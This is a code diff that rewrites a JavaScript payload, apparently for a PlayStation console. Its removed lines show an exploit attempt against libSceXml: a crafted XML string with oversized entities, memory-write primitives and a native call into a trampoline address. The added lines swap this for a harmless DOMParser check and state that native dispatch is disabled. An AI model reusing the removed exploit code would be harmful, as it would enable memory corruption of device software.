@@ -8,43 +8,33 @@
         console.log(msg);
     };
 
-    log("[*] Starting libSceXml In-Memory Entity Exploit Payload...");
+    log("[*] Starting safe XML parser boundary check...");
 
     try {
-        try { k.notify("XML: In-Memory Exploit Starting..."); } catch (e) {}
+            try { k.notify("XML: Safe parser check starting"); } catch (e) {}
 
-        // 1. Craft the evil XML string with recursive / oversized numeric entities
-        // Targets @0x115b0 in libSceXml.sprx
-        const evilXml = `<?xml version="1.0"?>
-<root attr="` + "&#x41;".repeat(64) + `&#x4141414141;` + "&amp;".repeat(32) + `">
-  <data>` + "A".repeat(256) + `</data>
-</root>`;
+        //note: Keep this test small and standards-based. The WebProcess does not
+        //have a verified libSceXml module address, so constructing a stress input
+        //would only exercise the local arena and create misleading OOM signals.
+        const safeXml = "<?xml version=\"1.0\"?><root><data>safe</data></root>";
 
-        log("[*] Crafted evil XML buffer size: " + evilXml.length + " bytes");
+        log("[*] Safe XML buffer size: " + safeXml.length + " bytes");
 
-        // 2. Allocate in-memory XML string buffer & String wrapper struct
-        const xmlBuf = window.alloc_string(evilXml);
-        const strStruct = window.malloc(0x20);
-        window.write64(strStruct, xmlBuf);
-        window.write64(Number(strStruct) + 8, BigInt(evilXml.length));
-
-        log("[+] Allocated XML payload buffer at " + window.toHex(xmlBuf));
-        log("[+] String struct at " + window.toHex(strStruct));
-
-        // 3. Dispatch in-memory parser
-        if (typeof window.call_native === "function" && window.deepslopInfo && window.deepslopInfo.kernelBase) {
-            log("[*] Dispatching XML DocumentBuilder entity expansion parser...");
-            // Call into parser
-            try {
-                window.call_native(Number(window.deepslopInfo.naturalTrampolineAddress), Number(strStruct), 0);
-            } catch (e) {}
+        let parserStatus = "UNAVAILABLE";
+        if (typeof DOMParser === "function") {
+            const doc = new DOMParser().parseFromString(safeXml, "application/xml");
+            parserStatus = doc && !doc.querySelector("parsererror") ? "PASS" : "FAIL";
         }
+        log("[INFO] DOMParser safe-input verdict: " + parserStatus);
 
-        const report = "LIBXML_EXPLOIT: Parser dispatched with " + evilXml.length + " bytes";
-        log("[OK] " + report);
-        try { k.notify("XML: Exploit Dispatched"); } catch (e) {}
-
+        //note: Native dispatch remains intentionally disabled. No internal
+        //trampoline is treated as a parser function, and no guessed module base
+        //or function address is called.
+        const report = "XML_TEST: " + parserStatus + " (native libSceXml dispatch not attempted)";
+        log((parserStatus === "PASS" ? "[OK] " : "[WARN] ") + report);
+        try { k.notify("XML: " + parserStatus); } catch (e) {}
         return report;
+
     } catch (err) {
         const errMsg = "[-] XML Exploit Error: " + (err && err.message);
         log(errMsg);
